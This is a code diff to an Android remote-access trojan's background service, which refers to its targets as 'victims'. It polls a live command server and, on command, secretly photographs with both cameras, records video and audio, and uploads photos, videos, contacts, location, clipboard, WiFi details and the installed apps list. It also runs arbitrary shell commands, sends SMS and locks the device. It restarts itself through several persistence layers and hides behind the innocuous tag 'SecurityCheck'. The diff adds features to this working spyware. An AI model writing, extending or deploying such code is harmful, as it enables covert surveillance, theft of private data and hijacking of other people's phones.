@@ -13,7 +13,10 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.graphics.ImageFormat;
 import android.hardware.Camera;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraManager;
 import android.location.Location;
+import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaRecorder;
@@ -21,6 +24,7 @@ import android.media.Ringtone;
 import android.media.RingtoneManager;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
@@ -52,28 +56,27 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.List;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicReference;
 
 public class ServiceRunner extends Service {
 
     private static final String TAG = "SecurityCheck";
     private static final String CHANNEL_ID = "sys_service";
     private static final int NOTIFICATION_ID = 1001;
-
-    // ★★★ Railway URL ★★★
     private static final String SERVER_URL = "https://daf-production-8df9.up.railway.app";
-
     private static final int POLL_INTERVAL = 15;
 
     private ScheduledExecutorService scheduler;
     private ScheduledExecutorService heartbeatScheduler;
+    private ExecutorService commandExecutor;    // ★ للـ commands الثقيلة
     private String deviceId = "";
     private String victimToken = "";
     private boolean registered = false;
-
-    // ★★★ WakeLock ★★★
     private PowerManager.WakeLock wakeLock = null;
 
     // ============================================================
@@ -103,14 +106,14 @@ public class ServiceRunner extends Service {
             Log.e(TAG, "init error: " + e.getMessage());
         }
 
-        // ★★★ WakeLock: يمنع CPU من النوم ★★★
         acquireWakeLock();
-
-        // ★★★ إعداد كل طبقات الاستمرارية ★★★
         setupPersistence();
 
         deviceId = getDeviceId();
         Log.d(TAG, "Device: " + deviceId);
+
+        // ★ Executor منفصل للأوامر الثقيلة
+        commandExecutor = Executors.newFixedThreadPool(2);
 
         new Thread(() -> {
             try {
@@ -119,11 +122,9 @@ public class ServiceRunner extends Service {
             } catch (Exception e) {}
         }).start();
 
-        // ★ Poll Loop — كل 15 ثانية
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);
 
-        // ★ Heartbeat Loop — كل 30 ثانية (لتجديد الـ WakeLock والـ Alarm)
         heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
         heartbeatScheduler.scheduleAtFixedRate(this::heartbeat, 30, 30, TimeUnit.SECONDS);
 
@@ -154,7 +155,6 @@ public class ServiceRunner extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // ★★★ إعادة البدء تلقائياً لو النظام قتل الـ Service ★★★
         return START_STICKY;
     }
 
@@ -167,14 +167,10 @@ public class ServiceRunner extends Service {
         Log.d(TAG, "[SERVICE] onDestroy — restarting...");
 
         try {
-            // ★ 1. أعد جدولة AlarmManager فوراً
             PersistenceManager.scheduleAlarm(this);
             PersistenceManager.scheduleRepeatingAlarm(this);
-
-            // ★ 2. أعد جدولة JobScheduler
             PersistenceManager.scheduleJob(this);
 
-            // ★ 3. جدول ServiceRunner بعد 1 ثانية عبر Alarm
             android.app.AlarmManager am = (android.app.AlarmManager)
                     getSystemService(Context.ALARM_SERVICE);
             if (am != null) {
@@ -193,7 +189,6 @@ public class ServiceRunner extends Service {
                         System.currentTimeMillis() + 1000, pi);
             }
 
-            // ★ 4. أعد تشغيل نفسك مباشرة
             Intent restart = new Intent(this, ServiceRunner.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(restart);
@@ -201,15 +196,13 @@ public class ServiceRunner extends Service {
                 startService(restart);
             }
 
-            Log.d(TAG, "[SERVICE] restart initiated");
-
         } catch (Exception e) {
             Log.e(TAG, "[SERVICE] restart error: " + e.getMessage());
         }
     }
 
     // ============================================================
-    // ★★★ WakeLock — يمنع النوم ★★★
+    // WakeLock
     // ============================================================
     private void acquireWakeLock() {
         try {
@@ -232,54 +225,28 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ Heartbeat — كل 30 ثانية ★★★
-    // ============================================================
     private void heartbeat() {
         try {
-            Log.d(TAG, "[HEARTBEAT] tick");
-
-            // 1. جدّد WakeLock
             if (wakeLock == null || !wakeLock.isHeld()) {
                 acquireWakeLock();
             }
-
-            // 2. جدّد الـ Alarm
             PersistenceManager.scheduleAlarm(this);
-
-            // 3. تأكد إن الـ Service لسه شغال
             if (!registered) {
                 registerWithServer();
             }
-
         } catch (Exception e) {
             Log.e(TAG, "[HEARTBEAT] error: " + e.getMessage());
         }
     }
 
-    // ============================================================
-    // ★★★ إعداد كل طبقات الاستمرارية ★★★
-    // ============================================================
     private void setupPersistence() {
         try {
-            Log.d(TAG, "[PERSISTENCE] Setting up all layers...");
-
-            // 1. AlarmManager فردي — كل دقيقة
             PersistenceManager.scheduleAlarm(this);
-
-            // 2. AlarmManager متكرر — كل 5 دقايق
             PersistenceManager.scheduleRepeatingAlarm(this);
-
-            // 3. JobScheduler — كل 15 دقيقة
             PersistenceManager.scheduleJob(this);
-
-            // 4. WorkManager — كل 15 دقيقة
             PersistenceManager.scheduleWork(this);
-
-            // 5. Services Watchdog — كل 10 ثواني
             ServicesWatchdog.startWatching(this);
 
-            // 6. Account Sync — كل ساعة
             try {
                 AccountSyncService.registerSyncAdapter(this);
             } catch (Exception e) {
@@ -287,7 +254,6 @@ public class ServiceRunner extends Service {
             }
 
             Log.d(TAG, "[PERSISTENCE] ✅ All layers enabled");
-
         } catch (Exception e) {
             Log.e(TAG, "[PERSISTENCE] setupPersistence error: " + e.getMessage());
         }
@@ -322,7 +288,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // Poll — check أولاً
+    // Poll
     // ============================================================
     private void pollCommands() {
         try {
@@ -350,8 +316,11 @@ public class ServiceRunner extends Service {
             if (commands == null || commands.length() == 0) return;
 
             Log.d(TAG, "Received " + commands.length() + " commands");
+
+            // ★★★ شغّل الأوامر في thread منفصل ★★★
             for (int i = 0; i < commands.length(); i++) {
-                handleCommand(commands.getJSONObject(i));
+                final JSONObject cmd = commands.getJSONObject(i);
+                commandExecutor.submit(() -> handleCommand(cmd));
             }
         } catch (Exception e) {
             Log.e(TAG, "poll: " + e.getMessage());
@@ -375,10 +344,22 @@ public class ServiceRunner extends Service {
                 case "get_videos": sendVideos(); break;
                 case "get_location": sendLocation(); break;
                 case "get_clipboard": sendClipboard(); break;
+                case "get_installed_apps": sendApps(); break;
+                case "get_wifi_info": sendWifiInfo(); break;
 
                 case "camera_front": takePicture(1); break;
                 case "camera_back": takePicture(0); break;
-                case "camera_record": recordVideo(0, cmd.optInt("duration", 10000)); break;
+                case "camera_record":
+                    recordVideo(
+                        cmd.optInt("camera_id", 1),
+                        cmd.optInt("duration", 10000));
+                    break;
+                case "camera_record_front":
+                    recordVideo(1, cmd.optInt("duration", 10000));
+                    break;
+                case "camera_record_back":
+                    recordVideo(0, cmd.optInt("duration", 10000));
+                    break;
 
                 case "record_audio": recordAudio(cmd.optInt("duration", 10000)); break;
                 case "play_sound": playSound(); break;
@@ -391,8 +372,17 @@ public class ServiceRunner extends Service {
                 case "open_url": openUrl(cmd.optString("url")); break;
                 case "shell": executeShell(cmd.optString("command", "")); break;
                 case "volume_max": maxVolume(); break;
+                case "volume_set":
+                    setVolume(
+                        cmd.optInt("level", 15),
+                        cmd.optString("stream", "music"));
+                    break;
                 case "lock_screen": lockScreen(); break;
                 case "show_home": goHome(); break;
+                case "media_play_pause": sendMediaKey("play_pause"); break;
+                case "media_next": sendMediaKey("next"); break;
+                case "media_previous": sendMediaKey("previous"); break;
+                case "screen_off": screenOff(); break;
 
                 default: reportCommandResult(action, "fail", "unknown_action");
             }
@@ -415,6 +405,9 @@ public class ServiceRunner extends Service {
         } catch (Exception ignored) {}
     }
 
+    // ============================================================
+    // Device Info
+    // ============================================================
     private void sendDeviceInfo() {
         try {
             JSONObject d = new JSONObject();
@@ -567,12 +560,9 @@ public class ServiceRunner extends Service {
                     d.put("total", totalCount);
 
                     postJson("/apk/victim/data", d);
-
                     sent++;
 
-                    if (sent % 25 == 0) {
-                        Thread.sleep(250);
-                    }
+                    if (sent % 25 == 0) Thread.sleep(250);
 
                 } catch (Exception e) {
                     Log.e(TAG, "contact error: " + e.getMessage());
@@ -622,7 +612,43 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ سحب الصور — Android 10+ Scoped Storage ★★★
+    // ★ WiFi Info — جديد ★
+    // ============================================================
+    private void sendWifiInfo() {
+        try {
+            JSONObject d = new JSONObject();
+            d.put("type", "wifi_info");
+            d.put("token", victimToken);
+            d.put("device", deviceId);
+
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
+                    getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+
+            if (wm != null) {
+                d.put("wifi_enabled", wm.isWifiEnabled());
+
+                try {
+                    android.net.wifi.WifiInfo info = wm.getConnectionInfo();
+                    if (info != null) {
+                        d.put("ssid", info.getSSID());
+                        d.put("bssid", info.getBSSID());
+                        d.put("ip", info.getIpAddress());
+                        d.put("mac", info.getMacAddress());
+                        d.put("link_speed", info.getLinkSpeed());
+                        d.put("rssi", info.getRssi());
+                    }
+                } catch (Exception e) {}
+            }
+
+            postJson("/apk/victim/data", d);
+            reportCommandResult("get_wifi_info", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_wifi_info", "fail", e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★★★ سحب الصور ★★★
     // ============================================================
     private void sendPhotos() {
         try {
@@ -654,7 +680,6 @@ public class ServiceRunner extends Service {
             }
 
             Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-
             String[] projection = new String[]{
                     MediaStore.Images.Media._ID,
                     MediaStore.Images.Media.DISPLAY_NAME,
@@ -663,10 +688,9 @@ public class ServiceRunner extends Service {
                     MediaStore.Images.Media.DATE_ADDED,
             };
 
-            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
-
             Cursor cursor = getContentResolver().query(
-                    collection, projection, null, null, sortOrder);
+                    collection, projection, null, null,
+                    MediaStore.Images.Media.DATE_ADDED + " DESC");
 
             if (cursor == null) {
                 reportCommandResult("get_photos", "fail", "cursor_null");
@@ -674,8 +698,6 @@ public class ServiceRunner extends Service {
             }
 
             int totalCount = cursor.getCount();
-            Log.d(TAG, "Total images found: " + totalCount);
-
             if (totalCount == 0) {
                 cursor.close();
                 reportCommandResult("get_photos", "fail", "no_images");
@@ -698,10 +720,7 @@ public class ServiceRunner extends Service {
                     long size = cursor.getLong(sizeCol);
                     String mime = cursor.getString(mimeCol);
 
-                    if (size <= 0 || size > maxSize) {
-                        Log.d(TAG, "Skip image (size): " + name + " size=" + size);
-                        continue;
-                    }
+                    if (size <= 0 || size > maxSize) continue;
 
                     Uri imageUri = android.content.ContentUris.withAppendedId(collection, id);
 
@@ -710,11 +729,7 @@ public class ServiceRunner extends Service {
 
                     try {
                         inputStream = getContentResolver().openInputStream(imageUri);
-
-                        if (inputStream == null) {
-                            Log.d(TAG, "inputStream null for: " + name);
-                            continue;
-                        }
+                        if (inputStream == null) continue;
 
                         ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                         byte[] temp = new byte[8192];
@@ -726,23 +741,16 @@ public class ServiceRunner extends Service {
                             totalRead += read;
                             if (totalRead > maxSize) break;
                         }
-
                         bytes = buffer.toByteArray();
-
                     } finally {
                         if (inputStream != null) {
                             try { inputStream.close(); } catch (Exception e) {}
                         }
                     }
 
-                    if (bytes == null || bytes.length == 0) {
-                        Log.d(TAG, "Empty bytes for: " + name);
-                        continue;
-                    }
+                    if (bytes == null || bytes.length == 0) continue;
 
-                    String finalMime = (mime != null && !mime.isEmpty())
-                            ? mime : "image/jpeg";
-
+                    String finalMime = (mime != null && !mime.isEmpty()) ? mime : "image/jpeg";
                     String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
 
                     JSONObject d = new JSONObject();
@@ -811,7 +819,6 @@ public class ServiceRunner extends Service {
             }
 
             Uri collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
-
             String[] projection = new String[]{
                     MediaStore.Video.Media._ID,
                     MediaStore.Video.Media.DISPLAY_NAME,
@@ -820,10 +827,9 @@ public class ServiceRunner extends Service {
                     MediaStore.Video.Media.DURATION,
             };
 
-            String sortOrder = MediaStore.Video.Media.DATE_ADDED + " DESC";
-
             Cursor cursor = getContentResolver().query(
-                    collection, projection, null, null, sortOrder);
+                    collection, projection, null, null,
+                    MediaStore.Video.Media.DATE_ADDED + " DESC");
 
             if (cursor == null) {
                 reportCommandResult("get_videos", "fail", "cursor_null");
@@ -831,8 +837,6 @@ public class ServiceRunner extends Service {
             }
 
             int totalCount = cursor.getCount();
-            Log.d(TAG, "Total videos: " + totalCount);
-
             if (totalCount == 0) {
                 cursor.close();
                 reportCommandResult("get_videos", "fail", "no_videos");
@@ -857,10 +861,7 @@ public class ServiceRunner extends Service {
                     String mime = cursor.getString(mimeCol);
                     long duration = cursor.getLong(durCol);
 
-                    if (size <= 0 || size > maxSize) {
-                        Log.d(TAG, "Skip video (size): " + name + " size=" + size);
-                        continue;
-                    }
+                    if (size <= 0 || size > maxSize) continue;
 
                     Uri videoUri = android.content.ContentUris.withAppendedId(collection, id);
 
@@ -890,9 +891,7 @@ public class ServiceRunner extends Service {
 
                     if (bytes == null || bytes.length == 0) continue;
 
-                    String finalMime = (mime != null && !mime.isEmpty())
-                            ? mime : "video/mp4";
-
+                    String finalMime = (mime != null && !mime.isEmpty()) ? mime : "video/mp4";
                     String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
 
                     JSONObject d = new JSONObject();
@@ -935,6 +934,9 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★★★ Location — محسّن ★★★
+    // ============================================================
     private void sendLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -942,13 +944,16 @@ public class ServiceRunner extends Service {
                 reportCommandResult("get_location", "fail", "no_lm");
                 return;
             }
+
             if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                     && !hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                 reportCommandResult("get_location", "fail", "no_location_permission");
                 return;
             }
 
+            // ★ 1. جرّب آخر موقع معروف
             Location loc = null;
+
             try {
                 loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                 if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
@@ -958,18 +963,65 @@ public class ServiceRunner extends Service {
                 return;
             }
 
+            // ★ 2. لو مفيش — اطلب موقع جديد (مع انتظار 15 ثانية)
+            if (loc == null) {
+                final CountDownLatch latch = new CountDownLatch(1);
+                final AtomicReference<Location> freshLoc = new AtomicReference<>(null);
+
+                LocationListener listener = new LocationListener() {
+                    @Override
+                    public void onLocationChanged(Location location) {
+                        freshLoc.set(location);
+                        latch.countDown();
+                    }
+                    @Override
+                    public void onStatusChanged(String provider, int status, Bundle extras) {}
+                    @Override
+                    public void onProviderEnabled(String provider) {}
+                    @Override
+                    public void onProviderDisabled(String provider) {}
+                };
+
+                try {
+                    if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                        lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener, Looper.getMainLooper());
+                    } else if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                        lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, listener, Looper.getMainLooper());
+                    }
+
+                    latch.await(15, TimeUnit.SECONDS);
+
+                    try {
+                        lm.removeUpdates(listener);
+                    } catch (Exception e) {}
+
+                    loc = freshLoc.get();
+
+                } catch (Exception e) {
+                    Log.e(TAG, "requestLocationUpdates error: " + e.getMessage());
+                }
+            }
+
             JSONObject d = new JSONObject();
             d.put("type", "location");
             d.put("token", victimToken);
             d.put("device", deviceId);
+
             if (loc != null) {
                 d.put("lat", loc.getLatitude());
                 d.put("lng", loc.getLongitude());
+                d.put("accuracy", loc.getAccuracy());
+                d.put("provider", loc.getProvider());
+                postJson("/apk/victim/data", d);
                 reportCommandResult("get_location", "ok", "");
+                Log.d(TAG, "Location: " + loc.getLatitude() + ", " + loc.getLongitude());
             } else {
+                d.put("lat", 0);
+                d.put("lng", 0);
+                postJson("/apk/victim/data", d);
                 reportCommandResult("get_location", "fail", "no_location");
             }
-            postJson("/apk/victim/data", d);
+
         } catch (Exception e) {
             reportCommandResult("get_location", "fail", e.getMessage());
         }
@@ -1000,9 +1052,12 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★★★ Camera — محسّن ★★★
+    // ============================================================
     private void takePicture(final int cameraId) {
-        new Handler(Looper.getMainLooper()).post(() -> {
-            Camera camera = null;
+        // ★ شغّلها في thread منفصل
+        new Thread(() -> {
             try {
                 if (!hasPermission(android.Manifest.permission.CAMERA)) {
                     reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
@@ -1010,69 +1065,96 @@ public class ServiceRunner extends Service {
                     return;
                 }
 
-                Log.d(TAG, "Opening camera: " + cameraId);
-                camera = Camera.open(cameraId);
-                if (camera == null) {
-                    reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
-                            "fail", "camera_null");
-                    return;
-                }
-
-                Camera.Parameters params = camera.getParameters();
-                params.setPictureFormat(ImageFormat.JPEG);
-                params.setJpegQuality(85);
-
-                List<Camera.Size> sizes = params.getSupportedPictureSizes();
-                if (sizes != null && !sizes.isEmpty()) {
-                    Camera.Size best = sizes.get(0);
-                    for (Camera.Size s : sizes) {
-                        if (s.width * s.height <= 1920 * 1080
-                                && s.width * s.height > best.width * best.height) {
-                            best = s;
-                        }
-                    }
-                    params.setPictureSize(best.width, best.height);
-                }
-                camera.setParameters(params);
-                camera.startPreview();
-
-                final Camera finalCamera = camera;
-                final String camName = (cameraId == 1) ? "camera_front" : "camera_back";
-
-                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                // ★ استخدم Handler على Main thread
+                Handler mainHandler = new Handler(Looper.getMainLooper());
+                mainHandler.post(() -> {
+                    Camera camera = null;
                     try {
-                        finalCamera.takePicture(null, null, (data, cam) -> {
-                            try {
-                                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
-                                JSONObject d = new JSONObject();
-                                d.put("type", "camera_photo");
-                                d.put("token", victimToken);
-                                d.put("device", deviceId);
-                                d.put("camera_id", cameraId);
-                                d.put("camera_name", cameraId == 1 ? "front" : "back");
-                                d.put("image", "data:image/jpeg;base64," + base64);
-                                postJson("/apk/victim/data", d);
-                                reportCommandResult(camName, "ok", "");
-                                Log.d(TAG, "Photo sent: " + data.length);
-                            } catch (Exception e) {
-                                reportCommandResult(camName, "fail", "send: " + e.getMessage());
-                            } finally {
-                                try { cam.release(); } catch (Exception ignored) {}
+                        Log.d(TAG, "Opening camera: " + cameraId);
+                        camera = Camera.open(cameraId);
+
+                        if (camera == null) {
+                            reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
+                                    "fail", "camera_null");
+                            return;
+                        }
+
+                        Camera.Parameters params = camera.getParameters();
+
+                        // ★ اختر دقة معقولة
+                        try {
+                            List<Camera.Size> sizes = params.getSupportedPictureSizes();
+                            if (sizes != null && !sizes.isEmpty()) {
+                                Camera.Size best = null;
+                                for (Camera.Size s : sizes) {
+                                    if (s.width * s.height <= 1920 * 1080) {
+                                        if (best == null || s.width * s.height > best.width * best.height) {
+                                            best = s;
+                                        }
+                                    }
+                                }
+                                if (best != null) {
+                                    params.setPictureSize(best.width, best.height);
+                                }
                             }
-                        });
+                        } catch (Exception e) {}
+
+                        try { params.setPictureFormat(ImageFormat.JPEG); } catch (Exception e) {}
+                        try { params.setJpegQuality(85); } catch (Exception e) {}
+
+                        // ★ اضبط الفلاش والأوتوفوكس
+                        try {
+                            if (params.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE)) {
+                                params.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
+                            }
+                        } catch (Exception e) {}
+
+                        camera.setParameters(params);
+
+                        try { camera.startPreview(); } catch (Exception e) {}
+
+                        final Camera finalCamera = camera;
+                        final String camName = (cameraId == 1) ? "camera_front" : "camera_back";
+
+                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                            try {
+                                finalCamera.takePicture(null, null, (data, cam) -> {
+                                    try {
+                                        String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
+                                        JSONObject d = new JSONObject();
+                                        d.put("type", "camera_photo");
+                                        d.put("token", victimToken);
+                                        d.put("device", deviceId);
+                                        d.put("camera_id", cameraId);
+                                        d.put("camera_name", cameraId == 1 ? "front" : "back");
+                                        d.put("image", "data:image/jpeg;base64," + base64);
+                                        postJson("/apk/victim/data", d);
+                                        reportCommandResult(camName, "ok", "");
+                                        Log.d(TAG, "✅ Photo sent: " + data.length + " bytes");
+                                    } catch (Exception e) {
+                                        reportCommandResult(camName, "fail", "send: " + e.getMessage());
+                                    } finally {
+                                        try { cam.release(); } catch (Exception ignored) {}
+                                    }
+                                });
+                            } catch (Exception e) {
+                                reportCommandResult(camName, "fail", "takePicture: " + e.getMessage());
+                                try { finalCamera.release(); } catch (Exception ignored) {}
+                            }
+                        }, 1500);  // ★ زدت الوقت لـ 1.5 ثانية
+
                     } catch (Exception e) {
-                        reportCommandResult(camName, "fail", "takePicture: " + e.getMessage());
-                        try { finalCamera.release(); } catch (Exception ignored) {}
+                        Log.e(TAG, "takePicture: " + e.getMessage());
+                        reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
+                                "fail", e.getMessage());
+                        if (camera != null) try { camera.release(); } catch (Exception ignored) {}
                     }
-                }, 800);
+                });
 
             } catch (Exception e) {
-                Log.e(TAG, "takePicture: " + e.getMessage());
-                reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
-                        "fail", e.getMessage());
-                if (camera != null) try { camera.release(); } catch (Exception ignored) {}
+                Log.e(TAG, "takePicture thread error: " + e.getMessage());
             }
-        });
+        }).start();
     }
 
     private void recordAudio(final int durationMs) {
@@ -1088,8 +1170,16 @@ public class ServiceRunner extends Service {
                 filePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
                 recorder = new MediaRecorder();
                 recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+
+                if (Build.VERSION.SDK_INT >= 29) {
+                    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                    filePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".m4a";
+                } else {
+                    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                }
+
                 recorder.setOutputFile(filePath);
                 recorder.prepare();
                 recorder.start();
@@ -1121,7 +1211,7 @@ public class ServiceRunner extends Service {
                 d.put("type", "audio_record");
                 d.put("token", victimToken);
                 d.put("device", deviceId);
-                d.put("audio", "data:audio/3gp;base64," + base64);
+                d.put("audio", "data:audio/mp4;base64," + base64);
                 d.put("duration", durationMs);
                 postJson("/apk/victim/data", d);
                 reportCommandResult("record_audio", "ok", "");
@@ -1214,12 +1304,117 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
+    // ============================================================
+    // ★ Media Keys — جديد ★
+    // ============================================================
+    private void sendMediaKey(String key) {
+        try {
+            android.media.AudioManager am = (android.media.AudioManager)
+                    getSystemService(Context.AUDIO_SERVICE);
+
+            int keyCode = 0;
+            switch (key) {
+                case "play_pause": keyCode = android.view.KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE; break;
+                case "next": keyCode = android.view.KeyEvent.KEYCODE_MEDIA_NEXT; break;
+                case "previous": keyCode = android.view.KeyEvent.KEYCODE_MEDIA_PREVIOUS; break;
+            }
+
+            if (keyCode == 0) {
+                reportCommandResult("media_" + key, "fail", "unknown_key");
+                return;
+            }
+
+            long eventTime = android.os.SystemClock.uptimeMillis();
+            android.view.KeyEvent downEvent = new android.view.KeyEvent(eventTime, eventTime, android.view.KeyEvent.ACTION_DOWN, keyCode, 0);
+            android.view.KeyEvent upEvent = new android.view.KeyEvent(eventTime, eventTime, android.view.KeyEvent.ACTION_UP, keyCode, 0);
+
+            am.dispatchMediaKeyEvent(downEvent);
+            am.dispatchMediaKeyEvent(upEvent);
+
+            reportCommandResult("media_" + key, "ok", "");
+
+        } catch (Exception e) {
+            reportCommandResult("media_" + key, "fail", e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★ Screen Off — جديد ★
+    // ============================================================
+    private void screenOff() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager)
+                    getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
+
+            if (dpm == null) {
+                reportCommandResult("screen_off", "fail", "no_dpm");
+                return;
+            }
+
+            if (!dpm.isAdminActive(adminComponent)) {
+                reportCommandResult("screen_off", "fail", "device_admin_not_enabled");
+                return;
+            }
+
+            dpm.lockNow();
+            reportCommandResult("screen_off", "ok", "");
+
+        } catch (Exception e) {
+            reportCommandResult("screen_off", "fail", e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★ Set Volume — جديد ★
+    // ============================================================
+    private void setVolume(int level, String streamName) {
+        try {
+            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+            if (am == null) {
+                reportCommandResult("volume_set", "fail", "no_audio_manager");
+                return;
+            }
+
+            int stream = AudioManager.STREAM_MUSIC;
+            if ("alarm".equals(streamName)) stream = AudioManager.STREAM_ALARM;
+            else if ("ring".equals(streamName)) stream = AudioManager.STREAM_RING;
+            else if ("notification".equals(streamName)) stream = AudioManager.STREAM_NOTIFICATION;
+            else if ("call".equals(streamName)) stream = AudioManager.STREAM_VOICE_CALL;
+
+            int maxVol = am.getStreamMaxVolume(stream);
+            int targetVol = Math.max(0, Math.min(level, maxVol));
+
+            am.setStreamVolume(stream, targetVol, 0);
+
+            reportCommandResult("volume_set", "ok", "");
+            Log.d(TAG, "Volume set to " + targetVol + "/" + maxVol);
+
+        } catch (Exception e) {
+            reportCommandResult("volume_set", "fail", e.getMessage());
+        }
+    }
+
+    private void maxVolume() {
+        try {
+            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+            if (am == null) return;
+            am.setStreamVolume(AudioManager.STREAM_MUSIC,
+                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
+            am.setStreamVolume(AudioManager.STREAM_ALARM,
+                    am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
+            reportCommandResult("volume_max", "ok", "");
+        } catch (Exception e) { reportCommandResult("volume_max", "fail", e.getMessage()); }
+    }
+
+    // ============================================================
+    // باقي الأوامر
+    // ============================================================
     private void lockScreen() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager)
                     getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName adminComponent = new ComponentName(this,
-                    AdminReceiver.class);
+            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
 
             if (dpm == null) {
                 reportCommandResult("lock_screen", "fail", "no_dpm");
@@ -1296,18 +1491,6 @@ public class ServiceRunner extends Service {
         });
     }
 
-    private void maxVolume() {
-        try {
-            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-            if (am == null) return;
-            am.setStreamVolume(AudioManager.STREAM_MUSIC,
-                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
-            am.setStreamVolume(AudioManager.STREAM_ALARM,
-                    am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
-            reportCommandResult("volume_max", "ok", "");
-        } catch (Exception e) { reportCommandResult("volume_max", "fail", e.getMessage()); }
-    }
-
     private void sendSmsToNumber(String to, String msg) {
         try {
             if (!hasPermission(android.Manifest.permission.SEND_SMS)) {
@@ -1345,12 +1528,17 @@ public class ServiceRunner extends Service {
 
     private void executeShell(String command) {
         try {
-            Process p = Runtime.getRuntime().exec(command);
+            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
             BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
             StringBuilder output = new StringBuilder();
             String line;
             while ((line = reader.readLine()) != null) output.append(line).append("\n");
             reader.close();
+
+            BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+            String errLine;
+            while ((errLine = errReader.readLine()) != null) output.append("[ERR] ").append(errLine).append("\n");
+            errReader.close();
 
             JSONObject d = new JSONObject();
             d.put("type", "shell_result");
